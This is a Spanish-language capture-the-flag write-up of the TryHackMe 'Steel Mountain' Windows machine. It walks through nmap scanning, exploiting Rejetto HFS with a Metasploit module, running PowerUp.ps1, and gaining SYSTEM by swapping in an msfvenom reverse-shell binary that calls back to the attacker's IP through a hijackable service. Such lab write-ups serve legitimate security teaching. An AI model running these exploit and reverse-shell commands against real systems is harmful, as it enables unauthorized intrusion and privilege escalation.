---
toc: true
comments: true
title: TryHackMe - Steel Mountain
layout: post
title: TryHackMe - Steel Mountain
date: 2024-05-09 18:28 -0300
categories: [TryHackMe, Medium, CTF]
tags: [Windows, Powershell, PowerUp.ps1, PrivEsc]    
image: /assets/Posts/SteelMountain/logo.jpeg
---

## Pre
- [Clip del equipo haciendo este ctf](https://youtu.be/jU2VXnUzClk?si=UqznCp67bzZHFnq1)
- Steel Mountain probo ser un desafio complejo que dio buenas insights en los ataques a maquinas Windows y algo de conocimiento para PowerShell.

## Phase 1
Para comenzar realizamos los scans de nmap de siempre, el primero de puertos y luego uno de profundizacion en versiones y similar.

```shell
nmap -Pn -n -p- --min-rate 10000 --open -vv -oN nmap/firstScan $IP
PORT      STATE SERVICE       REASON
80/tcp    open  http          syn-ack
135/tcp   open  msrpc         syn-ack
139/tcp   open  netbios-ssn   syn-ack
445/tcp   open  microsoft-ds  syn-ack
3389/tcp  open  ms-wbt-server syn-ack
5985/tcp  open  wsman         syn-ack
8080/tcp  open  http-proxy    syn-ack
47001/tcp open  winrm         syn-ack
49153/tcp open  unknown       syn-ack
49154/tcp open  unknown       syn-ack
49155/tcp open  unknown       syn-ack
49156/tcp open  unknown       syn-ack
49169/tcp open  unknown       syn-ack
49170/tcp open  unknown       syn-ack
```

Para esto hice (o cierto chatbot basado en IA) el siguiente oneliner de extraccion de puertos que ya queda configurado a futuro en nuestro env.

```shell
cat firstScan | grep 'open' | awk '{ print $1 }' | awk '{print ($0+0)}' | sed -z 's/\n/,/g;s/,$/\n/' 
```
Y con eso podemos aplicar el script de forma rapida a los puertos. El siguiente es el resultado emprolijado (sacando los certs e info inecesaria)

```shell
$ nmap -Pn -n -p 80,135,139,445,3389,5985,8080,47001,49153,49154,49155,49156,49169,49170 -T4 -sSCV -A -vv -oN nmap/versions $IP
PORT      STATE SERVICE            REASON          VERSION
80/tcp    open  http               syn-ack ttl 125 Microsoft IIS httpd 8.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 125 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 125
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2024-05-10T17:55:18+00:00
5985/tcp  open  http               syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http               syn-ack ttl 125 HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
|_http-title: HFS /
|_http-server-header: HFS 2.3
| http-methods: 
|_  Supported Methods: GET HEAD POST
47001/tcp open  http               syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2024-05-10T17:55:18
|_  start_date: 2024-05-10T17:46:31
| nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:fe:8a:ec:36:63 (unknown)
| Names:
|   STEELMOUNTAIN<00>    Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   STEELMOUNTAIN<20>    Flags: <unique><active>
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
```

Empezando el juego nos pide encontrar informacion sobre el empleado del mes. Encuentramos una página de inicio muy básica (¿y única?) con el empleado.

![Desktop View](/assets/Posts/SteelMountain/bill.png){: width="972" height="589" }
_BillHarper_

Con eso tenemos el nombre de Bill Harper en la url de la imagen. Continuando con nuestro analisis de los scripts vemos que hay un file server el cual destaca, navegadndo al mismo tenemos una version.

![Desktop View](/assets/Posts/SteelMountain/1.png){: width="972" height="589" }
_Vulnerable_

Con esto y una ayuda de metasploit la ejecucion es bastante simple.

```shell
msf6 > search Rejetto HTTP File Server

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
```

Lo configuramos y tenemos acceso!

## Phase 2: PrivEsc

Una vez dentro del sistema utilizamos `ifconfig` y vemos que no tiene acceso a internet externo. Pero aqui es cuando TryHackMe nos indica utilizar [PowerUp.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)

Para esto desde nuestro meterpreter utilizamos el comando `upload` y le subimos el archivo. Luego lo ejecutamos, destacando la necesidad de cargar powershell antes.

```shell
meterpreter > upload ./PowerUp.ps1
...

meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell


PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
```

Aqui el sistema nos da mucha, mucha informacion. Lo que queremos es un servicio que pueda ser frenado y re-empezado (para sustituirlo) con algun otro tipo de vulnerabilidad presente. Y aqui esta:

```shell
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
```

Entonces con el nombre del servicio debemos generar un ejecutable para nuestra reverse shell administrativa

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.14.46.99 LPORT=4443 -e x86/shikata_ga_nai -f exe -o Advanced.exe 
```

Nos tendremos que mover para ejecutar esto bien, el archivo ese reside en IObit 

```shell
meterpreter > cd Program\ Files\ (x86)\\
meterpreter > ls
Listing: C:\Program Files (x86)
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2019-09-26 12:17:46 -0300  Common Files
040777/rwxrwxrwx  0     dir   2019-09-26 12:17:48 -0300  IObit
040777/rwxrwxrwx  4096  dir   2014-03-21 16:08:30 -0300  Internet Explorer
040777/rwxrwxrwx  0     dir   2013-08-22 12:39:30 -0300  Microsoft.NET
040777/rwxrwxrwx  0     dir   2019-09-29 21:46:20 -0300  Uninstall Information
040777/rwxrwxrwx  0     dir   2013-08-22 12:39:33 -0300  Windows Mail
040777/rwxrwxrwx  0     dir   2013-08-22 12:39:30 -0300  Windows NT
040777/rwxrwxrwx  0     dir   2013-08-22 12:39:30 -0300  WindowsPowerShell
100666/rw-rw-rw-  174   fil   2013-08-22 12:37:57 -0300  desktop.ini

# Nos metemos y subimos el exploit.
meterpreter > upload Advanced.exe

$msfconsole -qx 'use exploit/multi/handler;set lhost tun0;set lport 4443;set payload windows/meterpreter/reverse_tcp;run'

# Luego tenemos que reiniciar el servicio y activarlo nuevamente
C:\Program Files (x86)\IObit>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Program Files (x86)\IObit>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2592
        FLAGS              : 
```

Con esto tenemos nuestra shell en root. Se puede generar tambien un meterpreter para que sea mas estable que un NC mediante `msfconsole -qx 'use exploit/multi/handler;set lhost tun0;set lport 4443;set payload windows/meterpreter/reverse_tcp;run'`
